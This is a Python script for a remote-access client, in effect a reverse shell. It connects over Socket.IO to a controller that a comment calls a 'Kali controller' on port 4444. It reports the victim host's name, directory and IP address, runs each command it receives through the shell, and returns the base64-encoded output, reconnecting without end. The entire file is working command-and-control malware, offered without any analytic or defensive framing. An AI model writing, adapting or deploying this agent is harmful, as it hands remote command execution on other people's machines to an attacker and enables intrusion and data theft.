#!/usr/bin/env python3
import socketio
import platform
import base64
import subprocess
import shlex
import os
import time
import uuid
import socket

# Use the actual IP of your Kali controller (server)
SERVER_IP = "192.168.193.113"
SERVER_PORT = 4444
SERVER_URL = f"http://{SERVER_IP}:{SERVER_PORT}"

RECONNECT_DELAY = 5
CLIENT_ID = uuid.uuid4().hex[:8]

sio = socketio.Client(reconnection=True, reconnection_attempts=0, logger=False, engineio_logger=False)

def b64(b: bytes) -> str:
    return base64.b64encode(b).decode()

def run_cmd(cmd, timeout=30):
    try:
        completed = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout)
        return completed.stdout
    except Exception as e:
        return str(e).encode()

@sio.event
def connect():
    print("connected to server")
    hostname = platform.node()
    cwd = os.getcwd()
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        ip = "unknown"
    sio.emit('register', {
        "client_id": CLIENT_ID,
        "hostname": hostname,
        "cwd": cwd,
        "addr": ip
    })

@sio.event
def disconnect():
    print("disconnected from server")

@sio.on('cmd')
def on_cmd(data):
    cmd = data.get('cmd', '')
    print("received cmd:", cmd)
    try:
        parts = shlex.split(cmd)
    except Exception:
        parts = []
    if parts and parts[0] == "cd":
        target = parts[1] if len(parts) > 1 else os.path.expanduser("~")
        target = os.path.expanduser(target)
        try:
            os.chdir(target)
            out = f"OK cwd: {os.getcwd()}\n".encode()
        except Exception as e:
            out = f"cd failed: {e}\n".encode()
    else:
        out = run_cmd(cmd)

    sio.emit('output', {
        "client_id": CLIENT_ID,
        "hostname": platform.node(),
        "cwd": os.getcwd(),
        "output": b64(out)
    })

def main():
    while True:
        try:
            print(f"Trying to connect to {SERVER_URL} ...")
            sio.connect(SERVER_URL, transports=['websocket'])
            sio.wait()
        except KeyboardInterrupt:
            print("exiting")
            break
        except Exception as e:
            print("connection failed:", e)
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    main()
